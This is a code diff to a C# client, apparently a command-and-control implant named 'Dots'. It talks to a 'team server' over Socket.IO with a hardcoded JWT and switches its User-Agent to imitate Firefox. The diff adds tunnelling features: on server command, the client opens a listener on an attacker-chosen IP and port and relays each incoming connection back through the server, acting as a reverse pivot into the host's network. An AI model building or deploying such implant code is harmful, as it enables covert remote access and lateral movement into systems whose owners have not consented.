@@ -7,11 +7,12 @@ using System.Threading.Tasks;
 using System.Text.Json;
 using System.Collections.Concurrent;
 using Dots.Models;
-using System.Threading;
 using SocketIOClient;
 using System.Net.Sockets;
 using System.Net;
 using System.Text.Json.Serialization;
+using System.Threading;
+using System.Runtime.Remoting.Messaging;
 
 namespace Dots
 {
@@ -37,7 +38,7 @@ namespace Dots
         {
             _client.BaseAddress = new Uri(TeamServerUri);
             _client.DefaultRequestHeaders.Clear();
-            _client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64; 1920x1080) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 en-GB");
+            _client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0");
             _client.DefaultRequestHeaders.Add("Accept", "application/json");
             _client.DefaultRequestHeaders.Add("Authorization", $"JWT e2FsZzpvckZ1UFYsdHlwOkpXVH0=.e3N1YjpvckZ1UFYsbmFtZTpKb2huIERvZSxpYXQ6MTY5NTgzODc1N30=.b3JGdVBW");
             _socketIOClient = new SocketIO(TeamServerUri, new SocketIOOptions
@@ -53,11 +54,23 @@ namespace Dots
             {
                 ParseBatchRequest(request.GetValue<TaskRequest[]>());
             });
-            _socketIOClient.On("stream_connect", request =>
+            _socketIOClient.On("stream_connect_request", request =>
             {
-                _ = StreamConnect(request.GetValue<string>());
+                _ = HandleStreamConnectRequest(request.GetValue<string>());
             });
-
+            _socketIOClient.On("stream_connect_results", request =>
+            {
+                _ = HandleStreamConnectResults(request.GetValue<string>());
+            });
+            _socketIOClient.On("stream_serve_request", request =>
+            {
+                Console.WriteLine("here");
+                _ = HandleStreamServeRequest(request.GetValue<string>());
+            });
+            _socketIOClient.On("stream_serve_stop", request =>
+            {
+                StreamServeStop();
+            });
             _socketIOClient.On("stream_upstream", request =>
             {
                 StreamUpstream(request.GetValue<string>());
@@ -101,8 +114,6 @@ namespace Dots
                 return null;
             }
         }
-
-
 
         public async Task RetrieveTasks()
         {
@@ -199,6 +210,7 @@ namespace Dots
             }
             return tasks;
         }
+
         private IEnumerable<TaskError> RetrieveBatchErrors()
         {
             var tasks = new List<TaskError>();
@@ -281,7 +293,7 @@ namespace Dots
             public long client_id { get; set; }
         }
 
-        private async Task StreamConnect(string socksConnectRequest)
+        private async Task HandleStreamConnectRequest(string socksConnectRequest)
         {
             var request = JsonSerializer.Deserialize<StreamConnectRequest>(socksConnectRequest);
             Socket remote = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -323,6 +335,141 @@ namespace Dots
             remote.ConnectAsync(connectEventArgs);
         }
 
+        private async Task HandleStreamConnectResults(string socksConnectResults)
+        {
+            var results = JsonSerializer.Deserialize<StreamConnectResults>(socksConnectResults);
+
+            if (_dotsProperty.RemoteConnections.TryGetValue(results.client_id, out Socket remote_connection))
+            {
+                if (results.rep == 0)
+                {
+                    Stream(remote_connection, results.client_id);
+                }
+            }
+        }
+
+        private class StreamServeRequest
+        {
+            [JsonPropertyName("ip")]
+            public string ip { get; set; }
+
+            [JsonPropertyName("port")]
+            public int port { get; set; }
+        }
+
+        private class StreamServeResults
+        {
+            [JsonPropertyName("status")]
+            public bool status { get; set; }
+
+            [JsonPropertyName("message")]
+            public string message { get; set; }
+        }
+
+        private void StreamServeStop()
+        {
+            Console.WriteLine("stopping");
+            _dotsProperty.StreamServeListener.Close();
+            _dotsProperty.SocketIOClient.EmitAsync("stream_serve_stop");
+        }
+
+        private async Task HandleStreamServeRequest(string streamServeRequest)
+        {
+            if (_dotsProperty.StreamServeListener.IsBound)
+            {
+                _dotsProperty.StreamServeListener.Close();
+            }
+
+            var request = JsonSerializer.Deserialize<StreamServeRequest>(streamServeRequest);
+
+            // Create a listening socket
+            Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+            try
+            {
+                // Use the specified IP address and port
+                listener.Bind(new IPEndPoint(IPAddress.Parse(request.ip), request.port));
+                listener.Listen(10);
+                _dotsProperty.StreamServeListener = listener;
+                StreamServeResults response = new StreamServeResults
+                {
+                    status = true // Binding succeeded
+                };
+                _dotsProperty.SocketIOClient.EmitAsync("stream_serve_results", response);
+            }
+            catch (Exception ex)
+            {
+                StreamServeResults response = new StreamServeResults
+                {
+                    status = false, // Binding failed
+                    message = ex.Message
+                };
+                _dotsProperty.SocketIOClient.EmitAsync("stream_serve_results", response);
+                return;
+            }
+
+            while (_dotsProperty.StreamServeListener.IsBound)
+            {
+                Socket clientSocket = await AcceptAsync(listener);
+                Console.WriteLine(((IPEndPoint)clientSocket.LocalEndPoint).Address.ToString());
+
+                if (clientSocket != null)
+                {
+                    Random random = new Random();
+                    long clientId = random.Next(100000000, 999999999);
+
+                    _dotsProperty.RemoteConnections.Add(clientId, clientSocket);
+
+                    string bindAddr = ((IPEndPoint)clientSocket.LocalEndPoint).Address.ToString();
+                    string bindPort = ((IPEndPoint)clientSocket.LocalEndPoint).Port.ToString();
+
+                    StreamConnectRequest response = new StreamConnectRequest
+                    {
+                        atype = 0,
+                        address = null,
+                        port = 0,
+                        client_id = clientId
+                    };
+
+                    _dotsProperty.SocketIOClient.EmitAsync("stream_connect_request", response);
+
+                }
+            }
+        }
+
+        private async Task<Socket> AcceptAsync(Socket listener)
+        {
+            var tcs = new TaskCompletionSource<Socket>();
+            SocketAsyncEventArgs acceptEventArgs = new SocketAsyncEventArgs();
+
+            acceptEventArgs.Completed += (s, e) =>
+            {
+                if (e.SocketError == SocketError.Success)
+                {
+                    tcs.SetResult(e.AcceptSocket);
+                }
+                else
+                {
+                    tcs.SetException(new SocketException((int)e.SocketError));
+                }
+            };
+
+            if (!listener.AcceptAsync(acceptEventArgs))
+            {
+                // Synchronous completion, handle immediately
+                if (acceptEventArgs.SocketError == SocketError.Success)
+                {
+                    tcs.SetResult(acceptEventArgs.AcceptSocket);
+                }
+                else
+                {
+                    tcs.SetException(new SocketException((int)acceptEventArgs.SocketError));
+                }
+            }
+
+            return await tcs.Task;
+        }
+
         private class DownstreamResults
         {
             [JsonPropertyName("data")]
@@ -353,6 +500,8 @@ namespace Dots
             };
             remote.ReceiveAsync(e);
         }
+
+
 
         private class UpStreamRequest
         {
